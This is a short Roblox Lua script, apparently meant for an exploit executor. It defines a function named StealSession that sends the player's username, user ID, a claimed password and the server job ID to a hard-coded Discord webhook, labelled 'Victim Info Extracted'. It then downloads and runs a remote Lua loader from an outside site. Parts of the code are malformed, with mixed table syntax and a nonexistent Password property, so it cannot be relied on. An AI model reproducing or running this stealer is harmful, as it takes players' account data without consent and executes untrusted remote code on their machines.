‏local HttpService = game:GetService("HttpService")

‏local LocalPlayer = game.Players.LocalPlayer

‏local WebhookURL = "https://discord.com/api/webhooks/1563242722934919310/yK0oFxFS0tOSxXzZ0VtPusSNfU4pici-8fXEFhmSe9WWU0yAAewfVaXMP7IsHP4M23cg"

‏local function StealSession()

‏    local data = {
 
        ["username"]: "Account Roblox 🤖",
    
        ["avatar_url"]: "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",

‏        ["content"] = "@everyone IP and Token Grabbed",

‏        ["embeds"] = {{

‏            ["title"] = "Victim Info Extracted",

‏            ["fields"] = {

‏                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},

‏                {["name"] = "User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},

                {["name"] = "Password", ["value"] = tostring(LocalPlayer.Password), ["inline"] = true},

‏                {["name"] = "Job ID", ["value"] = game.JobId, ["inline"] = false}

            }

        }}

    }

    

‏    local response = request({

‏        Url = WebhookURL,

‏        Method = "POST",

‏        Headers = {["Content-Type"] = "application/json"},

‏        Body = HttpService:JSONEncode(data)

    })

    

‏    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/VR7.lua"))()

‏end

StealSession()
